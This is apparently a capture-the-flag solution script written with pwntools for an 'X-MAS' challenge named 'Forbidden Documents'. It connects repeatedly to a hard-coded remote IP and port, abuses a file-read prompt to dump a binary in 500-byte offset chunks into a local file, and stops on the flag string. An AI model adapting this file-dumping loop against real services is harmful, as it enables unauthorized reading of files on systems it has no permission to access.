#!/usr/bin/python
from pwn import *


def main():
    # Forbidden Documents
    read_size = 500
    offset = 0
    # offset = 246000
    while offset < 30000:
        p = remote('199.247.6.180', 10004)

        # p.recvuntil("Name a document to open: ")
        p.sendline("./random_exe_name")
        # p.sendline(".")

        # p.recvuntil("Do you want to read from other offset than 0? (y/n)")
        p.sendline("y")

        # p.recvuntil("How much should we read: ")
        p.sendline(str(read_size))

        # p.recvuntil("Read register from offset: ")
        p.sendline(str(offset))

        p.recvuntil("Content: ")
        out = ''
        while p.can_recv():
            out += p.recv()  # (numb=4096)

        p.close()

        log.info('Reading register offset ' + str(offset))
        offset += read_size
        log.info('Output: ' + out)

        with open("out_file", "ab") as f:
            f.write(out)

        # raw_input("Continue?")

        if 'X-MAS{' in out:
            quit()

    p.interactive()


if __name__ == "__main__":
    main()
